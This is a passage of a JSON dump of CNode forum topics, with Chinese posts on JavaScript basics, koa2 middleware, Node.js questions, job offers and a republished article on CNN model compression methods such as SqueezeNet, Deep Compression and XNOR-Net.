中的对象其实就是一组数据和功能的集合。</td>\n</tr>\n<tr>\n<td>Symbol</td>\n<td>ES6 中新加入的数据类型，表示独一无二的值。</td>\n</tr>\n</tbody>\n</table>\n<p><strong>其中 <code>Object</code> 类型包含 <code>Function</code>、<code>Array</code>、<code>Date</code>、<code>RegExp</code>。</strong></p>\n<h2>JavaScript 中的内置对象</h2>\n<table>\n<thead>\n<tr>\n<th>对象名称</th>\n<th>对象说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Arguments</td>\n<td>函数参数集合</td>\n</tr>\n<tr>\n<td>Array</td>\n<td>数组</td>\n</tr>\n<tr>\n<td>Boolean</td>\n<td>布尔对象</td>\n</tr>\n<tr>\n<td>Date</td>\n<td>日期对象</td>\n</tr>\n<tr>\n<td>Error</td>\n<td>异常对象</td>\n</tr>\n<tr>\n<td>Function</td>\n<td>函数构造器</td>\n</tr>\n<tr>\n<td>Math</td>\n<td>数学对象</td>\n</tr>\n<tr>\n<td>Number</td>\n<td>数值对象</td>\n</tr>\n<tr>\n<td>Object</td>\n<td>基础对象</td>\n</tr>\n<tr>\n<td>String</td>\n<td>字符串对象</td>\n</tr>\n</tbody>\n</table>\n<h2><code>typeof null</code> 返回结果为 <code>'object'</code></h2>\n<p>  从逻辑上来看，<code>null</code> 值表示一个空对象指针，因此会返回一个 <code>'object'</code>，也可以理解为是 JavaScript 早期的一个BUG，而现在标准就是这样规范的。V8曾经修正并实现过<code>typeof null === 'null'</code>,但最终证明不可行。<a href=\"http://wiki.ecmascript.org/doku.php?id=harmony:typeof_null\">http://wiki.ecmascript.org/doku.php?id=harmony:typeof_null</a></p>\n<h2><code>Array</code> 对象方法与作用</h2>\n<table>\n<thead>\n<tr>\n<th>方法名称</th>\n<th>对象说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>concat</td>\n<td>用于连接两个或更多的数组并返回结果,<code>arr1.concat(arr2)</code></td>\n</tr>\n<tr>\n<td>join</td>\n<td>把数组的所有元素放入一个字符串，元素通过制定的分隔符进行分离 <code>arr1.join(',')</code></td>\n</tr>\n<tr>\n<td>pop</td>\n<td>删除并返回数组中的最后一个元素 <code>arr1.pop()</code></td>\n</tr>\n<tr>\n<td>push</td>\n<td>向数组的末尾添加一个或更多元素，并返回新的长度 <code>arr1.push(1)</code></td>\n</tr>\n<tr>\n<td>reverse</td>\n<td>颠倒数组中的元素顺序,<code>arr1.reverse()</code></td>\n</tr>\n<tr>\n<td>shift</td>\n<td>删除并返回数组中的第一个元素  <code>arr1.shift()</code></td>\n</tr>\n<tr>\n<td>slice</td>\n<td>从某个已有的数组返回指定的元素</td>\n</tr>\n<tr>\n<td>sort</td>\n<td>对数组的元素进行排序 <code>arr1.sort()</code></td>\n</tr>\n<tr>\n<td>splice</td>\n<td>删除元素，并向数组中添加新元素</td>\n</tr>\n<tr>\n<td>toString</td>\n<td>把数组转成字符串 <code>arr1.toString()</code></td>\n</tr>\n<tr>\n<td>toLocaleString</td>\n<td>把数组转换为本地字符串 <code>arr1.toLocaleString()</code></td>\n</tr>\n<tr>\n<td>valueOf</td>\n<td>返回数组对象的原始值</td>\n</tr>\n</tbody>\n</table>\n<h2><code>typeof</code> 可能的返回值</h2>\n<table>\n<thead>\n<tr>\n<th>类型</th>\n<th>返回结果</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Undefined</td>\n<td>“undefined”</td>\n</tr>\n<tr>\n<td>Null</td>\n<td>“object”</td>\n</tr>\n<tr>\n<td>Boolean</td>\n<td>“boolean”</td>\n</tr>\n<tr>\n<td>Number</td>\n<td>“number”</td>\n</tr>\n<tr>\n<td>String</td>\n<td>“string”</td>\n</tr>\n<tr>\n<td>Symbol （ECMAScript 6 新增）</td>\n<td>“symbol”</td>\n</tr>\n<tr>\n<td>宿主对象（由JS环境提供）</td>\n<td>Implementation-dependent</td>\n</tr>\n<tr>\n<td>函数对象（[[Call]] 在ECMA-262条款中实现了）</td>\n<td>“function”</td>\n</tr>\n<tr>\n<td>任何其他对象</td>\n<td>“object”</td>\n</tr>\n</tbody>\n</table>\n<blockquote>\n<p>上述来自 <a href=\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/typeof\">MDN</a></p>\n</blockquote>\n<p>对文章有不正确之处，请给予纠正。<a href=\"https://github.com/SilenceHVK/articles/issues/16\">github 文章</a> 请顺手给个 Star，最后感谢您的阅读。</p>\n</div>","title":"【JavaScript 基础知识】一篇关于 JavaScript 一些知识点的总结 —— 持续更新","last_reply_at":"2019-01-06T12:35:41.805Z","good":false,"top":false,"reply_count":26,"visit_count":4614,"create_at":"2018-01-20T03:12:21.593Z","author":{"loginname":"SilenceHVK","avatar_url":"https://avatars3.githubusercontent.com/u/12862565?v=4&s=120"}},{"id":"5c31ddf73898674067a7bbe0","author_id":"5c2f299a5bf06c5e7e3f15d5","tab":"ask","content":"<div class=\"markdown-text\"><p><img src=\"//static.cnodejs.org/FkEVlHNxtAr9IXfCirnwOU31sebr\" alt=\"屏幕快照 2019-01-06 下午6.49.37.png\"></p>\n<p>我们都知道执行顺序。</p>\n<pre class=\"prettyprint\"><code>开始执行中间件1\n开始执行中间件2\n结束执行中间件2\n结束执行中间件1\n</code></pre><p>我也看了源码, 我迷惑的洋葱模式是怎么从ctx2跳回到ctx1的，也就是这个到过来的顺序怎么跳进去的。从ctx1进入ctx2通过koa-compose很好理解。</p>\n<p><img src=\"//static.cnodejs.org/FtLU--GIGtSZL2olDVCSinV0sOtg\" alt=\"屏幕快照 2019-01-06 下午6.52.17.png\"></p>\n</div>","title":"关于koa2中间件执行顺序问题","last_reply_at":"2019-01-06T11:53:35.856Z","good":false,"top":false,"reply_count":1,"visit_count":541,"create_at":"2019-01-06T10:52:39.254Z","author":{"loginname":"NuoHui","avatar_url":"https://avatars2.githubusercontent.com/u/42414989?v=4&s=120"}},{"id":"5c2b02e53898674067a79ee6","author_id":"564582ec5e7412b625b8bf16","tab":"share","content":"<div class=\"markdown-text\"><p>我想找半兼职的小伙伴一起做项目，每周上固定两天班，第三天按照情况上（可能不上），每周最多上三天班，工资照常发，此外，项目完成后有提成。上班以及工资根据项目走。\nweixin:c35353</p>\n<p>来自酷炫的 <a href=\"https://github.com/TakWolf/CNode-Material-Design\">CNodeMD</a></p>\n</div>","title":"云南.昆明 寻求一起做项目的小伙伴","last_reply_at":"2019-01-06T01:55:27.733Z","good":false,"top":false,"reply_count":4,"visit_count":1110,"create_at":"2019-01-01T06:04:21.698Z","author":{"loginname":"RajanZhan","avatar_url":"https://avatars1.githubusercontent.com/u/15818327?v=4&s=120"}},{"id":"5c231ec53898674067a78913","author_id":"5624a9c7573d7ba30ab1506e","tab":"share","content":"<div class=\"markdown-text\"><p>不知道大家有没有跟我一样的情况，总是需要了解一些前沿的技术；其目的可能是为了让技术精进，也有可能是害怕技术落后而掉队；总之需要从各类网站了解一些前沿信息。</p>\n<p>以我举例，我经常在（<a href=\"https://news.ycombinator.com/\">Hacker News</a>、<a href=\"https://medium.com/\">Medium</a>、<a href=\"https://dev.to/\">Dev.to</a>、<a href=\"https://twitter.com/\">Twitter</a>、<a href=\"http://www.ruanyifeng.com/blog/\">阮一峰</a>、<a href=\"https://github.com/\">GitHub 关注</a>、<a href=\"https://weibo.com/\">微博</a>、<a href=\"https://www.v2ex.com/\">V2EX</a>、<a href=\"https://ruby-china.org/\">Ruby China</a>、<a href=\"https://github.com/trending\">GitHub Trending</a>）等地去学习。通过整理后，把每天值得分享的内容，发布到公司的 QQ 群里，让大家和我同时受益。</p>\n<p>学习加整理这个过程是非常耗时的。所以我希望有一个像阮一峰老师的<a href=\"http://www.ruanyifeng.com/blog/2018/12/weekly-issue-36.html\">每周分享</a>，或者蚂蚁金服<a href=\"https://github.com/sorrycc/\">陈成</a>一样的微信群，来快速的学习有价值的东西。</p>\n<p>可能是这个信息源我还没有找到，所以我打算自己来做，于是才有了这个开源项目。</p>\n<p>这个项目会以前端技术体系为主要分享课题。<br>\n内容会以：文章、工具、新闻、视频等几大板块作为主要分类。<br>\n如果我的分享对你有所帮助，还请大家给个 ⭐️ 让更多的人知道<a href=\"https://github.com/wubaiqing/zaobao\">它</a>。</p>\n<blockquote>\n<p>GitHub : <a href=\"https://github.com/wubaiqing/zaobao\">https://github.com/wubaiqing/zaobao</a></p>\n</blockquote>\n<blockquote>\n<p>访问地址 : <a href=\"https://wubaiqing.github.io/zaobao/\">https://wubaiqing.github.io/zaobao/</a></p>\n</blockquote>\n</div>","title":"以快报的方式，分享前端技术体系。","last_reply_at":"2019-01-05T12:36:34.847Z","good":false,"top":false,"reply_count":6,"visit_count":1252,"create_at":"2018-12-26T06:25:09.091Z","author":{"loginname":"wubaiqing","avatar_url":"https://avatars0.githubusercontent.com/u/1062448?v=4&s=120"}},{"id":"5bdaa1f993f8d64f74b013fe","author_id":"56e0e2b78023c6146ec3fe91","tab":"share","content":"<div class=\"markdown-text\"><p><a href=\"http://fenghuangyu.cn:9035/\">http://fenghuangyu.cn:9035/</a></p>\n<p><a href=\"https://github.com/dangyanglim/go_cnode\">https://github.com/dangyanglim/go_cnode</a></p>\n<p>来点个赞</p>\n</div>","title":"go_cnode：用go语言重写了cnode","last_reply_at":"2019-01-05T11:15:04.674Z","good":false,"top":false,"reply_count":14,"visit_count":1792,"create_at":"2018-11-01T06:49:29.709Z","author":{"loginname":"dangyanglim","avatar_url":"https://avatars2.githubusercontent.com/u/16640185?v=4&s=120"}},{"id":"5bbcc9b7ede204052db80442","author_id":"539f0e47c3ee0b58206856bc","tab":"share","content":"<div class=\"markdown-text\"><p>需要2个前端高手兼职，主要是做些动画效果，一个case代码量都是非常少的，主要是需要流程漂亮的动画效果。\n远程，时间要求不高，长期做。\n有想法的发邮件 <a href=\"mailto:tiantian@zbmate.com\">tiantian@zbmate.com</a>.\n发邮件的时候，请附上简历，最好codepen上面有些作品。</p>\n</div>","title":"寻找前端高手兼职","last_reply_at":"2019-01-05T09:51:20.844Z","good":false,"top":false,"reply_count":12,"visit_count":2503,"create_at":"2018-10-09T15:31:03.210Z","author":{"loginname":"superway117","avatar_url":"https://avatars0.githubusercontent.com/u/1629654?v=4&s=120"}},{"id":"5c301d2d3898674067a7b733","author_id":"57346bbf32bf2c90579f529f","tab":"ask","content":"<div class=\"markdown-text\"><p>是不是只能用node-mssql？还有tedious</p>\n</div>","title":"关于node.js（egg）连接SQL Server问题，有啥高效简洁的方式吗？egg-sequelize好像用不了吧？","last_reply_at":"2019-01-05T05:59:12.590Z","good":false,"top":false,"reply_count":2,"visit_count":657,"create_at":"2019-01-05T02:57:49.827Z","author":{"loginname":"dpc761218914","avatar_url":"https://avatars3.githubusercontent.com/u/16233212?v=4&s=120"}},{"id":"5c303ad03898674067a7b7ba","author_id":"55b895d735ce2ac164f51850","tab":"ask","content":"<div class=\"markdown-text\"><p>一般js编译之后，报错出现的堆栈信息都是编译后的位置，看不出具体在代码哪一行</p>\n<p>例如报错出现这种，只知道503但是不知道哪个连接访问503 也不知道在哪个代码行报错。\n请问类似这种编译后的代码的报错堆栈怎样才能把比较准确，更多的信息打印出来</p>\n<pre class=\"prettyprint language-js\"><code>  at renderComponent (node_modules&#x2F;vue-server-renderer&#x2F;build.js:7488:5)\n at renderNode (node_modules&#x2F;vue-server-renderer&#x2F;build.js:7404:5)\n\n (node:56785) UnhandledPromiseRejectionWarning: Error: Request failed with status code 503\n   at createError (&#x2F;var&#x2F;www&#x2F;mobile&#x2F;releases&#x2F;20190104205921&#x2F;node_modules&#x2F;axios&#x2F;lib&#x2F;core&#x2F;createError.js:16:15)\n  at settle (&#x2F;var&#x2F;www&#x2F;mobile&#x2F;releases&#x2F;20190104205921&#x2F;node_modules&#x2F;axios&#x2F;lib&#x2F;core&#x2F;settle.js:18:12)\n   at IncomingMessage.handleStreamEnd (&#x2F;var&#x2F;www&#x2F;mobile&#x2F;releases&#x2F;20190104205921&#x2F;node_modules&#x2F;axios&#x2F;lib&#x2F;adapters&#x2F;http.js:192:11)\n  at IncomingMessage.emit (events.js:187:15)\n  at IncomingMessage.EventEmitter.emit (domain.js:442:20)\n  at IncomingMessage.wrapped (&#x2F;var&#x2F;www&#x2F;mobile&#x2F;releases&#x2F;20190104205921&#x2F;node_modules&#x2F;newrelic&#x2F;lib&#x2F;transaction&#x2F;tracer&#x2F;index.js:181:22)\n   at IncomingMessage.wrappedResponseEmit (&#x2F;var&#x2F;www&#x2F;mobile&#x2F;releases&#x2F;20190104205921&#x2F;node_modules&#x2F;newrelic&#x2F;lib&#x2F;instrumentation&#x2F;core&#x2F;http-outbound.js:98:26)\n    at endReadableNT (_stream_readable.js:1094:12)\n    at wrapped (&#x2F;var&#x2F;www&#x2F;mobile&#x2F;releases&#x2F;20190104205921&#x2F;node_modules&#x2F;newrelic&#x2F;lib&#x2F;transaction&#x2F;tracer&#x2F;index.js:181:22)\n   at args.(anonymous function) (&#x2F;usr&#x2F;local&#x2F;lib&#x2F;node_modules&#x2F;pm2&#x2F;node_modules&#x2F;event-loop-inspector&#x2F;index.js:138:29)\n</code></pre></div>","title":"使用nuxt js ssr 之后，出现报错堆栈信息无法看到准确信息","last_reply_at":"2019-01-05T05:04:16.124Z","good":false,"top":false,"reply_count":0,"visit_count":510,"create_at":"2019-01-05T05:04:16.124Z","author":{"loginname":"scalaview","avatar_url":"https://avatars3.githubusercontent.com/u/3685513?v=4&s=120"}},{"id":"5b7cc49aa210553a0cde2b00","author_id":"5ab852d6320bb09d69e231f1","tab":"ask","content":"<div class=\"markdown-text\"><p>麻烦问下大家,现在开发微信公众号npm哪个包好用啊?我看网上有说node-wechat的,有说node-weixin的,在淘宝镜像搜索wechat关键字,出现下面一大堆,大家能不能推荐一个bug少 稳定一些的,我看node-wechat最后一次更新是2017年7月</p>\n<p><img src=\"//static.cnodejs.org/FgHOPSTO9lHXMQzO10e_sO8yjG4M\" alt=\"QQ截图.jpg\"></p>\n</div>","title":"node.js开发微信公众号","last_reply_at":"2019-01-04T20:35:22.597Z","good":false,"top":false,"reply_count":11,"visit_count":1473,"create_at":"2018-08-22T02:04:10.480Z","author":{"loginname":"iori2882","avatar_url":"https://avatars3.githubusercontent.com/u/1480587?v=4&s=120"}},{"id":"5c2c337f3898674067a7a1fe","author_id":"5c176d22f3d48d2397c12134","tab":"share","content":"<div class=\"markdown-text\"><blockquote>\n<p>本文由云+社区发表</p>\n</blockquote>\n<blockquote>\n<p>导语：卷积神经网络日益增长的深度和尺寸为深度学习在移动端的部署带来了巨大的挑战，CNN模型压缩与加速成为了学术界和工业界都重点关注的研究领域之一。</p>\n</blockquote>\n<h2>前言</h2>\n<p>自从AlexNet一举夺得ILSVRC 2012 ImageNet图像分类竞赛的冠军后，卷积神经网络（CNN）的热潮便席卷了整个计算机视觉领域。CNN模型火速替代了传统人工设计（hand-crafted）特征和分类器，不仅提供了一种端到端的处理方法，还大幅度地刷新了各个图像竞赛任务的精度，更甚者超越了人眼的精度（LFW人脸识别任务）。CNN模型在不断逼近计算机视觉任务的精度极限的同时，其深度和尺寸也在成倍增长。</p>\n<p>自从AlexNet一举夺得ILSVRC 2012 ImageNet图像分类竞赛的冠军后，卷积神经网络（CNN）的热潮便席卷了整个计算机视觉领域。CNN模型火速替代了传统人工设计（hand-crafted）特征和分类器，不仅提供了一种端到端的处理方法，还大幅度地刷新了各个图像竞赛任务的精度，更甚者超越了人眼的精度（LFW人脸识别任务）。CNN模型在不断逼近计算机视觉任务的精度极限的同时，其深度和尺寸也在成倍增长。</p>\n<p>表1 几种经典模型的尺寸，计算量和参数数量对比</p>\n<table>\n<thead>\n<tr>\n<th>Model</th>\n<th>Model Size(MB)</th>\n<th>MillionMult-Adds</th>\n<th>MillionParameters</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>AlexNet[1]</td>\n<td>&gt;200</td>\n<td>720</td>\n<td>60</td>\n</tr>\n<tr>\n<td>VGG16[2]</td>\n<td>&gt;500</td>\n<td>15300</td>\n<td>138</td>\n</tr>\n<tr>\n<td>GoogleNet[3]</td>\n<td>~50</td>\n<td>1550</td>\n<td>6.8</td>\n</tr>\n<tr>\n<td>Inception-v3[4]</td>\n<td>90-100</td>\n<td>5000</td>\n<td>23.2</td>\n</tr>\n</tbody>\n</table>\n<p>随之而来的是一个很尴尬的场景：如此巨大的模型只能在有限的平台下使用，根本无法移植到移动端和嵌入式芯片当中。就算想通过网络传输，但较高的带宽占用也让很多用户望而生畏。另一方面，大尺寸的模型也对设备功耗和运行速度带来了巨大的挑战。因此这样的模型距离实用还有一段距离。</p>\n<p>在这样的情形下，模型小型化与加速成了亟待解决的问题。其实早期就有学者提出了一系列CNN模型压缩方法，包括权值剪值（prunning）和矩阵SVD分解等，但压缩率和效率还远不能令人满意。</p>\n<p>近年来，关于模型小型化的算法从压缩角度上可以大致分为两类：从模型权重数值角度压缩和从网络架构角度压缩。另一方面，从兼顾计算速度方面，又可以划分为：仅压缩尺寸和压缩尺寸的同时提升速度。</p>\n<p>本文主要讨论如下几篇代表性的文章和方法，包括SqueezeNet[5]、Deep Compression[6]、XNorNet[7]、Distilling[8]、MobileNet[9]和ShuffleNet[10]，也可按照上述方法进行大致分类：</p>\n<p>表2 几种经典压缩方法及对比</p>\n<table>\n<thead>\n<tr>\n<th>Method</th>\n<th>Compression Approach</th>\n<th>Speed Consideration</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>SqueezeNet</td>\n<td>architecture</td>\n<td>No</td>\n</tr>\n<tr>\n<td>Deep Compression</td>\n<td>weights</td>\n<td>No</td>\n</tr>\n<tr>\n<td>XNorNet</td>\n<td>weights</td>\n<td>Yes</td>\n</tr>\n<tr>\n<td>Distilling</td>\n<td>architecture</td>\n<td>No</td>\n</tr>\n<tr>\n<td>MobileNet</td>\n<td>architecture</td>\n<td>Yes</td>\n</tr>\n<tr>\n<td>ShuffleNet</td>\n<td>architecture</td>\n<td>Yes</td>\n</tr>\n</tbody>\n</table>\n<h2>一、SqueezeNet</h2>\n<h3>1.1 设计思想</h3>\n<p>SqueezeNet是F. N. Iandola,S.Han等人于2016年的论文《SqueezeNet: AlexNet-level accuracy with 50x fewer parameters and &lt; 0.5MB model size》中提出的一个小型化的网络模型结构，该网络能在保证不损失精度的同时，将原始AlexNet压缩至原来的510倍左右（&lt; 0.5MB）。</p>\n<p>SqueezeNet的核心指导思想是——在保证精度的同时使用最少的参数。</p>\n<p>而这也是所有模型压缩方法的一个终极目标。</p>\n<p>基于这个思想，SqueezeNet提出了3点网络结构设计策略：</p>\n<p>策略 1.将3x3卷积核替换为1x1卷积核。</p>\n<p>这一策略很好理解，因为1个1x1卷积核的参数是3x3卷积核参数的1/9，这一改动理论上可以将模型尺寸压缩9倍。</p>\n<p>策略 2.减小输入到3x3卷积核的输入通道数。</p>\n<p>我们知道，对于一个采用3x3卷积核的卷积层，该层所有卷积参数的数量（不考虑偏置）为：</p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1503043408182_8757_1503043407986.jpg\" alt=\"img\"></p>\n<p>式中，N是卷积核的数量，也即输出通道数，C是输入通道数。</p>\n<p>因此，为了保证减小网络参数，不仅仅需要减少3x3卷积核的数量，还需减少输入到3x3卷积核的输入通道数量，即式中C的数量。</p>\n<p>策略 3.尽可能的将降采样放在网络后面的层中。</p>\n<p>在卷积神经网络中，每层输出的特征图（feature map）是否下采样是由卷积层的步长或者池化层决定的。而一个重要的观点是：分辨率越大的特征图（延迟降采样）可以带来更高的分类精度，而这一观点从直觉上也可以很好理解，因为分辨率越大的输入能够提供的信息就越多。</p>\n<p>上述三个策略中，前两个策略都是针对如何降低参数数量而设计的，最后一个旨在最大化网络精度。</p>\n<h3>1.2 网络架构</h3>\n<p>基于以上三个策略，作者提出了一个类似inception的网络单元结构，取名为fire module。一个fire module 包含一个squeeze 卷积层（只包含1x1卷积核）和一个expand卷积层（包含1x1和3x3卷积核）。其中，squeeze层借鉴了inception的思想，利用1x1卷积核来降低输入到expand层中3x3卷积核的输入通道数。如图1所示。</p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1503043861364_2276_1503043861528.jpg\" alt=\"img\"></p>\n<p>图1 Fire module结构示意图[5]</p>\n<p>其中，定义squeeze层中1x1卷积核的数量是s1x1，类似的，expand层中1x1卷积核的数量是e1x1， 3x3卷积核的数量是e3x3。令s1x1 &lt; e1x1+ e3x3从而保证输入到3x3的输入通道数减小。SqueezeNet的网络结构由若干个 fire module 组成，另外文章还给出了一些架构设计上的细节：</p>\n<ul>\n<li>为了保证1x1卷积核和3x3卷积核具有相同大小的输出，3x3卷积核采用1像素的zero-padding和步长</li>\n<li>squeeze层和expand层均采用RELU作为激活函数</li>\n<li>在fire9后采用50%的dropout</li>\n<li>由于全连接层的参数数量巨大，因此借鉴NIN[11]的思想，去除了全连接层而改用global average pooling。</li>\n</ul>\n<h3>1.3 实验结果</h3>\n<p>表3 不同压缩方法在ImageNet上的对比实验结果[5]</p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1503044043520_4732_1503044043424.jpg\" alt=\"img\"></p>\n<p>上表显示，相比传统的压缩方法，SqueezeNet能在保证精度不损（甚至略有提升）的情况下，达到最大的压缩率，将原始AlexNet从240MB压缩至4.8MB，而结合Deep Compression后更能达到0.47MB，完全满足了移动端的部署和低带宽网络的传输。</p>\n<p>此外，作者还借鉴ResNet思想，对原始网络结构做了修改，增加了旁路分支，将分类精度提升了约3%。</p>\n<h3>1.4 速度考量</h3>\n<p>尽管文章主要以压缩模型尺寸为目标，但毋庸置疑的一点是，SqueezeNet在网络结构中大量采用1x1和3x3卷积核是有利于速度的提升的，对于类似caffe这样的深度学习框架，在卷积层的前向计算中，采用1x1卷积核可避免额外的im2col操作，而直接利用gemm进行矩阵加速运算，因此对速度的优化是有一定的作用的。然而，这种提速的作用仍然是有限的，另外，SqueezeNet采用了9个fire module和两个卷积层，因此仍需要进行大量常规卷积操作，这也是影响速度进一步提升的瓶颈。</p>\n<h2>二、Deep Compression</h2>\n<p>Deep Compression出自S.Han 2016 ICLR的一篇论文《Deep Compression: Compressing Deep Neural Networks with Pruning, Trained Quantization and Huffman Coding》。该文章获得了ICLR 2016的最佳论文奖，同时也具有里程碑式的意义，引领了CNN模型小型化与加速研究方向的新狂潮，使得这一领域近两年来涌现出了大量的优秀工作与文章。</p>\n<h3>2.1 算法流程</h3>\n<p>与前面的“架构压缩派”的SqueezeNet不同，Deep Compression是属于“权值压缩派”的。而两篇文章均出自S.Han团队，因此两种方法结合，双剑合璧，更是能达到登峰造极的压缩效果。这一实验结果也在上表中得到验证。</p>\n<p>Deep Compression的算法流程包含三步，如图2所示：</p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1503044080167_7843_1503044080031.jpg\" alt=\"img\"></p>\n<p>图2 Deep Compression Pipeline[6]</p>\n<p>1、Pruning(权值剪枝)</p>\n<p>剪枝的思想其实早已在早期论文中可以窥见，LeCun等人曾经就利用剪枝来稀疏网络，减小过拟合的风险，提升网络泛化性。</p>\n<p>图3是MNIST上训练得到的LeNet conv1卷积层中的参数分布，可以看出，大部分权值集中在0处附近，对网络的贡献较小，在剪值中，将0值附近的较小的权值置0，使这些权值不被激活，从而着重训练剩下的非零权值，最终在保证网络精度不变的情况下达到压缩尺寸的目的。</p>\n<p>实验发现模型对剪枝更敏感，因此在剪值时建议逐层迭代修剪，另外每层的剪枝比例如何自动选取仍然是一个值得深入研究的课题。</p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1503044142463_7928_1503044142307.jpg\" alt=\"img\"></p>\n<p>图3 LeNet conv1层权值分布图</p>\n<p>2、Quantization (权值量化)</p>\n<p>此处的权值量化基于权值聚类，将连续分布的权值离散化，从而减小需要存储的权值数量。</p>\n<ul>\n<li>初始化聚类中心，实验证明线性初始化效果最好；</li>\n<li>利用k-means算法进行聚类，将权值划分到不同的cluster中；</li>\n<li>在前向计算时，每个权值由其聚类中心表示；</li>\n<li>在后向计算时，统计每个cluster中的梯度和将其反传。</li>\n</ul>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1503044178138_5668_1503044178190.jpg\" alt=\"img\"></p>\n<p>图4 权值量化前向和后向计算过程[6]</p>\n<p>3、Huffman encoding(霍夫曼编码)</p>\n<p>霍夫曼编码采用变长编码将平均编码长度减小，进一步压缩模型尺寸。</p>\n<h3>2.2 模型存储</h3>\n<p>前述的剪枝和量化都是为了实现模型的更紧致的压缩，以实现减小模型尺寸的目的。</p>\n<ul>\n<li>对于剪枝后的模型，由于每层大量参数为0，后续只需将非零值及其下标进行存储，文章中采用CSR（Compressed Sparse Row）来进行存储，这一步可以实现9x~13x的压缩率。</li>\n<li>对于量化后的模型，每个权值都由其聚类中心表示（对于卷积层，聚类中心设为256个，对于全连接层，聚类中心设为32个），因此可以构造对应的码书和下标，大大减少了需要存储的数据量，此步能实现约3x的压缩率。</li>\n<li>最后对上述压缩后的模型进一步采用变长霍夫曼编码，实现约1x的压缩率。</li>\n</ul>\n<h3>2.3 实验结果</h3>\n<p>表4 不同网络采用Deep Compression后的压缩率[6]</p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1503044250370_1999_1503044250242.jpg\" alt=\"img\"></p>\n<p>通过SqueezeNet+Deep Compression,可以将原始240M的AlexNet压缩至0.47M，实现约510x的压缩率。</p>\n<h3>2.4 速度考量</h3>\n<p>可以看出，Deep Compression的主要设计是针对网络存储尺寸的压缩，但在前向时，如果将存储模型读入展开后，并没有带来更大的速度提升。因此Song H.等人专门针对压缩后的模型设计了一套基于FPGA的硬件前向加速框架EIE[12]，有兴趣的可以研究一下。</p>\n<h2>三、XNorNet</h2>\n<p>二值网络一直是模型压缩和加速领域经久不衰的研究课题之一。将原始32位浮点型的权值压缩到1比特，如何最大程度地减小性能损失就成为了研究的关键。</p>\n<p>此篇论文主要有以下几个贡献：</p>\n<ul>\n<li>提出了一个BWN（Binary-Weight-Network）和XNOR-Network，前者只对网络参数做二值化，带来约32x的存储压缩和2x的速度提升，而后者对网络输入和参数都做了二值化，在实现32x存储压缩的同时带了58x的速度提升；</li>\n<li>提出了一个新型二值化权值的算法；</li>\n<li>第一个在大规模数据集如ImageNet上提交二值化网络结果的工作；</li>\n<li>无需预训练，可实现training from scratch。</li>\n</ul>\n<h3>3.1 BWN</h3>\n<p>为了训练二值化权值网络，令</p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1503044330975_5264_1503044330701.jpg\" alt=\"img\"></p>\n<p>，其中</p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1503044342797_2370_1503044342554.jpg\" alt=\"img\"></p>\n<p>，即二值滤波器，</p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1503044352539_8028_1503044352296.jpg\" alt=\"img\"></p>\n<p>是是尺度因子。通过最小化目标函数，得到其最优解：</p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1503044364590_1466_1503044364348.jpg\" alt=\"img\"></p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1503044399421_3843_1503044399188.jpg\" alt=\"img\"></p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1503044406942_4201_1503044406709.jpg\" alt=\"img\"></p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1503044414059_9968_1503044413823.jpg\" alt=\"img\"></p>\n<p>即最优的二值化滤波器张量B即为原始参数的符号函数，最优的尺度因子为每个滤波器权值的绝对值的均值。</p>\n<p>训练算法如图5所示，值得注意的是，只有在前向计算和后向传播时使用二值化后的权值，在更新参数时依然使用原始参数，这是因为如果使用二值化后的参数会导致很小的梯度下降，从而使得训练无法收敛。</p>\n<h3>3.2 XNOR-Net</h3>\n<p>在XNOR网络中，优化的目标是将两个实数向量的点乘近似到两个二值向量的点乘，即</p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1503044451768_8668_1503044451558.jpg\" alt=\"img\"></p>\n<p>式中，</p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1503044469905_6017_1503044469671.jpg\" alt=\"img\"></p>\n<p>，</p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1503044484939_794_1503044484939.jpg\" alt=\"img\"></p>\n<p>类似的，有最优解如下式</p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1503044515532_2850_1503044515314.jpg\" alt=\"img\"></p>\n<p>在卷积计算中，输入和权值均量化成了二值，因此传统的乘法计算变成了异或操作，而非二值化数据的计算只占了很小一部分。</p>\n<p>XNOR-Net中一个典型的卷积单元如图6所示，与传统单元不同，各模块的顺序有了调整。为了减少二值化带来的精度损失，对输入数据首先进行BN归一化处理，BinActiv层用于对输入做二值化，接着进行二值化的卷积操作，最后进行pooling。</p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1503044536850_6862_1503044536873.jpg\" alt=\"img\"></p>\n<p>图5 BWN训练过程[7]</p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1503044576780_3830_1503044576578.jpg\" alt=\"img\"></p>\n<p>图6 传统卷积单元与XNOR-Net卷积单元对比[7]</p>\n<h3>3.3 实验结果</h3>\n<p>表5 ImageNet上二值网络与AlexNet结果对比[7]</p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1503044603844_2268_1503044603650.jpg\" alt=\"img\"></p>\n<p>与ALexNet相比，BWN网络能够达到精度基本不变甚至略好，XNOR-Net由于对输入也做了二值化，性能稍降。</p>\n<h2>四、Distilling</h2>\n<p>Distilling算法是Hinton等人在论文Distilling the Knowledge in a Neural Network中提出的一种类似网络迁移的学习算法。</p>\n<h3>4.1 